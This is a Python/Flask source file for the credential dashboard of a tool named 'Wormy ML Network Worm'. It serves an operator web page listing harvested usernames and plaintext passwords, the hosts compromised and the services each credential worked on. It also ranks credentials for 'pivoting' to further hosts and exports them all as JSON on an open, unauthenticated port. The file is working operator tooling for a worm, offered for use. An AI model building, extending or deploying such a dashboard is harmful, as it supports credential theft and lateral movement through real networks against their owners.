"""
Wormy ML Network Worm - Credential Dashboard
Web dashboard for viewing and managing discovered credentials.
"""

import json
import logging
import os
import sys
import threading
import time
from datetime import datetime
from typing import Dict, List, Optional

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from utils.logger import logger

logging.getLogger("werkzeug").setLevel(logging.ERROR)
logging.getLogger("flask.app").setLevel(logging.ERROR)

try:
    from flask import Flask, jsonify, render_template_string, request

    FLASK_AVAILABLE = True
except ImportError:
    FLASK_AVAILABLE = False


class CredentialDashboard:
    """
    Credential Dashboard

    Features:
    - View all discovered credentials
    - Filter by service, host, source
    - Credential ranking and scoring
    - Pivoting recommendations
    - Export credentials
    """

    def __init__(self, worm_core=None, host: str = "0.0.0.0", port: int = 5002):
        self.worm = worm_core
        self.host = host
        self.port = port
        self._thread = None

        if not FLASK_AVAILABLE:
            logger.error("Flask not available for Credential Dashboard")
            return

        self.app = Flask(__name__)
        self._setup_routes()
        logger.info(f"Credential Dashboard initialized on {host}:{port}")

    def _setup_routes(self):
        @self.app.route("/")
        def index():
            return render_template_string(self._get_html())

        @self.app.route("/api/credentials")
        def api_credentials():
            return jsonify(self._get_credentials())

        @self.app.route("/api/stats")
        def api_stats():
            return jsonify(self._get_stats())

        @self.app.route("/api/export")
        def api_export():
            creds = self._get_credentials()
            return jsonify(creds), 200, {
                "Content-Disposition": "attachment; filename=credentials.json"
            }

        @self.app.route("/api/pivot_recommendations")
        def api_pivot():
            return jsonify(self._get_pivot_recommendations())

    def _get_credentials(self) -> Dict:
        """Get all discovered credentials"""
        credentials = []

        if self.worm and hasattr(self.worm, "cred_manager") and self.worm.cred_manager:
            cm = self.worm.cred_manager
            for key, cred in cm.credentials.items():
                if cred.success_count > 0 or cred.source == "discovered":
                    credentials.append(
                        {
                            "username": cred.username,
                            "password": cred.password,
                            "service": cred.service,
                            "source": cred.source,
                            "success_rate": cred.success_rate,
                            "success_count": cred.success_count,
                            "attempt_count": cred.attempt_count,
                            "confidence": cred.confidence,
                            "hosts_compromised": cred.hosts_compromised,
                            "services_worked": list(cred.services_worked),
                            "last_success": datetime.fromtimestamp(
                                cred.last_success
                            ).isoformat()
                            if cred.last_success > 0
                            else None,
                        }
                    )

        # Sort by confidence score
        credentials.sort(key=lambda c: c.get("confidence", 0), reverse=True)

        return {"credentials": credentials, "total": len(credentials)}

    def _get_stats(self) -> Dict:
        """Get credential statistics"""
        stats = {
            "total_credentials": 0,
            "successful_credentials": 0,
            "discovered_credentials": 0,
            "services_covered": set(),
            "top_usernames": {},
            "top_passwords": {},
        }

        if self.worm and hasattr(self.worm, "cred_manager") and self.worm.cred_manager:
            cm = self.worm.cred_manager
            stats["total_credentials"] = len(cm.credentials)
            stats["successful_credentials"] = sum(
                1 for c in cm.credentials.values() if c.success_count > 0
            )
            stats["discovered_credentials"] = len(cm.get_discovered_credentials())
            stats["services_covered"] = list(
                set(c.service for c in cm.credentials.values())
            )

            # Top usernames
            username_counts = {}
            for cred in cm.credentials.values():
                username_counts[cred.username] = (
                    username_counts.get(cred.username, 0) + 1
                )
            stats["top_usernames"] = dict(
                sorted(username_counts.items(), key=lambda x: x[1], reverse=True)[:10]
            )

            # Top passwords
            password_counts = {}
            for cred in cm.credentials.values():
                if cred.password:
                    password_counts[cred.password] = (
                        password_counts.get(cred.password, 0) + 1
                    )
            stats["top_passwords"] = dict(
                sorted(password_counts.items(), key=lambda x: x[1], reverse=True)[:10]
            )

        return stats

    def _get_pivot_recommendations(self) -> Dict:
        """Get credential pivoting recommendations"""
        recommendations = []

        if self.worm and hasattr(self.worm, "cred_manager") and self.worm.cred_manager:
            cm = self.worm.cred_manager
            for key, cred in cm.credentials.items():
                if cred.success_count > 0 and cred.hosts_compromised > 0:
                    recommendations.append(
                        {
                            "username": cred.username,
                            "password": cred.password[:4] + "..."
                            if len(cred.password) > 4
                            else cred.password,
                            "confidence": cred.confidence,
                            "hosts_compromised": cred.hosts_compromised,
                            "services_worked": list(cred.services_worked),
                            "recommendation": (
                                "HIGH priority for pivoting"
                                if cred.confidence > 0.5
                                else "Medium priority for pivoting"
                            ),
                        }
                    )

        recommendations.sort(key=lambda r: r["confidence"], reverse=True)
        return {"recommendations": recommendations[:20]}

    def _get_html(self) -> str:
        return """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wormy - Credentials</title>
    <style>
        :root {
            --bg-primary: #0a0a0a;
            --bg-secondary: #111111;
            --bg-tertiary: #1a1a1a;
            --border: #222222;
            --text-primary: #e5e5e5;
            --text-secondary: #888888;
            --text-muted: #555555;
            --accent: #3b82f6;
            --success: #22c55e;
            --warning: #f59e0b;
            --danger: #ef4444;
            --purple: #a855f7;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: var(--bg-primary);
            color: var(--text-primary);
            min-height: 100vh;
            font-size: 13px;
        }

        .header {
            background: var(--bg-secondary);
            border-bottom: 1px solid var(--border);
            padding: 0 20px;
            height: 48px;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }
        .header h1 { font-size: 14px; font-weight: 500; }
        .header .actions { display: flex; gap: 8px; }

        .btn {
            padding: 6px 12px;
            border: 1px solid var(--border);
            background: var(--bg-tertiary);
            color: var(--text-primary);
            border-radius: 6px;
            cursor: pointer;
            font-size: 12px;
            font-family: inherit;
            font-weight: 500;
            transition: all 0.15s;
        }
        .btn:hover { background: var(--border); }
        .btn-primary { background: var(--accent); border-color: var(--accent); color: #fff; }
        .btn-primary:hover { background: #2563eb; }

        .container { max-width: 1400px; margin: 0 auto; padding: 20px; }

        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 12px;
            margin-bottom: 20px;
        }
        .stat-card {
            background: var(--bg-secondary);
            border: 1px solid var(--border);
            border-radius: 8px;
            padding: 16px;
        }
        .stat-card .label { color: var(--text-secondary); font-size: 11px; text-transform: uppercase; letter-spacing: 0.05em; }
        .stat-card .value { font-size: 24px; font-weight: 600; margin-top: 4px; }
        .stat-card .value.success { color: var(--success); }
        .stat-card .value.warning { color: var(--warning); }
        .stat-card .value.accent { color: var(--accent); }
        .stat-card .value.purple { color: var(--purple); }

        .filters {
            display: flex;
            gap: 12px;
            margin-bottom: 16px;
            flex-wrap: wrap;
        }
        .filter-input {
            padding: 8px 12px;
            background: var(--bg-secondary);
            border: 1px solid var(--border);
            border-radius: 6px;
            color: var(--text-primary);
            font-size: 12px;
            font-family: inherit;
            min-width: 150px;
        }
        .filter-input:focus { outline: none; border-color: var(--accent); }

        .table-container {
            background: var(--bg-secondary);
            border: 1px solid var(--border);
            border-radius: 8px;
            overflow: hidden;
        }
        table { width: 100%; border-collapse: collapse; }
        th {
            background: var(--bg-tertiary);
            padding: 10px 12px;
            text-align: left;
            font-size: 11px;
            font-weight: 600;
            color: var(--text-secondary);
            text-transform: uppercase;
            letter-spacing: 0.05em;
            border-bottom: 1px solid var(--border);
        }
        td {
            padding: 10px 12px;
            border-bottom: 1px solid var(--border);
            font-size: 12px;
        }
        tr:last-child td { border-bottom: none; }
        tr:hover td { background: var(--bg-tertiary); }

        .badge {
            display: inline-block;
            padding: 2px 8px;
            border-radius: 4px;
            font-size: 10px;
            font-weight: 500;
        }
        .badge-success { background: rgba(34, 197, 94, 0.15); color: var(--success); }
        .badge-warning { background: rgba(245, 158, 11, 0.15); color: var(--warning); }
        .badge-accent { background: rgba(59, 130, 246, 0.15); color: var(--accent); }
        .badge-purple { background: rgba(168, 85, 247, 0.15); color: var(--purple); }

        .confidence-bar {
            width: 60px;
            height: 4px;
            background: var(--bg-tertiary);
            border-radius: 2px;
            overflow: hidden;
            display: inline-block;
            vertical-align: middle;
            margin-right: 6px;
        }
        .confidence-fill { height: 100%; background: var(--success); transition: width 0.3s; }

        .password-mask { font-family: monospace; }
    </style>
</head>
<body>
    <div class="header">
        <h1>Credential Intelligence</h1>
        <div class="actions">
            <button class="btn" onclick="refreshData()">Refresh</button>
            <button class="btn btn-primary" onclick="exportCredentials()">Export JSON</button>
        </div>
    </div>

    <div class="container">
        <div class="stats-grid" id="stats-grid"></div>

        <div class="filters">
            <input type="text" class="filter-input" id="filter-service" placeholder="Filter by service...">
            <input type="text" class="filter-input" id="filter-source" placeholder="Filter by source...">
            <input type="text" class="filter-input" id="filter-username" placeholder="Filter by username...">
            <select class="filter-input" id="sort-by">
                <option value="confidence">Sort: Confidence</option>
                <option value="success_rate">Sort: Success Rate</option>
                <option value="hosts">Sort: Hosts Compromised</option>
            </select>
        </div>

        <div class="table-container">
            <table>
                <thead>
                    <tr>
                        <th>Username</th>
                        <th>Password</th>
                        <th>Service</th>
                        <th>Source</th>
                        <th>Confidence</th>
                        <th>Success Rate</th>
                        <th>Hosts</th>
                        <th>Services</th>
                        <th>Last Success</th>
                    </tr>
                </thead>
                <tbody id="credentials-table"></tbody>
            </table>
        </div>
    </div>

    <script>
        let allCredentials = [];

        function refreshData() {
            Promise.all([
                fetch('/api/credentials').then(r => r.json()),
                fetch('/api/stats').then(r => r.json())
            ]).then(([creds, stats]) => {
                allCredentials = creds.credentials || [];
                renderStats(stats);
                renderTable(allCredentials);
            });
        }

        function renderStats(stats) {
            const grid = document.getElementById('stats-grid');
            grid.innerHTML = `
                <div class="stat-card">
                    <div class="label">Total Credentials</div>
                    <div class="value accent">${stats.total_credentials || 0}</div>
                </div>
                <div class="stat-card">
                    <div class="label">Successful</div>
                    <div class="value success">${stats.successful_credentials || 0}</div>
                </div>
                <div class="stat-card">
                    <div class="label">Discovered</div>
                    <div class="value warning">${stats.discovered_credentials || 0}</div>
                </div>
                <div class="stat-card">
                    <div class="label">Services Covered</div>
                    <div class="value purple">${(stats.services_covered || []).length}</div>
                </div>
            `;
        }

        function renderTable(creds) {
            const tbody = document.getElementById('credentials-table');
            if (!creds.length) {
                tbody.innerHTML = '<tr><td colspan="9" style="text-align:center;color:var(--text-muted);padding:40px;">No credentials discovered yet</td></tr>';
                return;
            }

            tbody.innerHTML = creds.map(c => {
                const confPct = Math.round((c.confidence || 0) * 100);
                const successPct = Math.round((c.success_rate || 0) * 100);
                const pwDisplay = c.password ? c.password.substring(0, 4) + (c.password.length > 4 ? '...' : '') : '<em>empty</em>';
                const servicesDisplay = (c.services_worked || []).slice(0, 3).join(', ') + ((c.services_worked || []).length > 3 ? '...' : '');
                const sourceBadge = c.source === 'discovered' ? 'badge-success' : c.source === 'wordlist' ? 'badge-accent' : 'badge-purple';

                return `<tr>
                    <td><strong>${c.username || '<em>empty</em>'}</strong></td>
                    <td><span class="password-mask">${pwDisplay}</span></td>
                    <td><span class="badge badge-accent">${c.service}</span></td>
                    <td><span class="badge ${sourceBadge}">${c.source}</span></td>
                    <td>
                        <div class="confidence-bar"><div class="confidence-fill" style="width:${confPct}%"></div></div>
                        ${confPct}%
                    </td>
                    <td>${successPct}%</td>
                    <td>${c.hosts_compromised || 0}</td>
                    <td>${servicesDisplay || '-'}</td>
                    <td>${c.last_success ? new Date(c.last_success).toLocaleTimeString() : '-'}</td>
                </tr>`;
            }).join('');
        }

        function exportCredentials() {
            fetch('/api/export').then(r => r.json()).then(data => {
                const blob = new Blob([JSON.stringify(data, null, 2)], {type: 'application/json'});
                const url = URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.href = url;
                a.download = 'wormy_credentials.json';
                a.click();
                URL.revokeObjectURL(url);
            });
        }

        // Filter handlers
        document.getElementById('filter-service').addEventListener('input', applyFilters);
        document.getElementById('filter-source').addEventListener('input', applyFilters);
        document.getElementById('filter-username').addEventListener('input', applyFilters);
        document.getElementById('sort-by').addEventListener('change', applyFilters);

        function applyFilters() {
            const service = document.getElementById('filter-service').value.toLowerCase();
            const source = document.getElementById('filter-source').value.toLowerCase();
            const username = document.getElementById('filter-username').value.toLowerCase();
            const sortBy = document.getElementById('sort-by').value;

            let filtered = allCredentials.filter(c => {
                if (service && !(c.service || '').toLowerCase().includes(service)) return false;
                if (source && !(c.source || '').toLowerCase().includes(source)) return false;
                if (username && !(c.username || '').toLowerCase().includes(username)) return false;
                return true;
            });

            // Sort
            filtered.sort((a, b) => {
                if (sortBy === 'confidence') return (b.confidence || 0) - (a.confidence || 0);
                if (sortBy === 'success_rate') return (b.success_rate || 0) - (a.success_rate || 0);
                if (sortBy === 'hosts') return (b.hosts_compromised || 0) - (a.hosts_compromised || 0);
                return 0;
            });

            renderTable(filtered);
        }

        // Auto-refresh
        setInterval(refreshData, 5000);
        window.onload = refreshData;
    </script>
</body>
</html>
"""

    def run(self, debug: bool = False):
        if not FLASK_AVAILABLE:
            return
        import logging as _log

        _log.getLogger("werkzeug").setLevel(_log.ERROR)
        logger.info(f"Starting Credential Dashboard on {self.host}:{self.port}")
        self.app.run(
            host=self.host,
            port=self.port,
            debug=False,
            threaded=True,
            use_reloader=False,
        )

    def run_background(self):
        if not FLASK_AVAILABLE:
            return None
        self._thread = threading.Thread(target=self.run, daemon=True)
        self._thread.start()
        logger.info(f"Credential Dashboard running at http://{self.host}:{self.port}")
        return self._thread
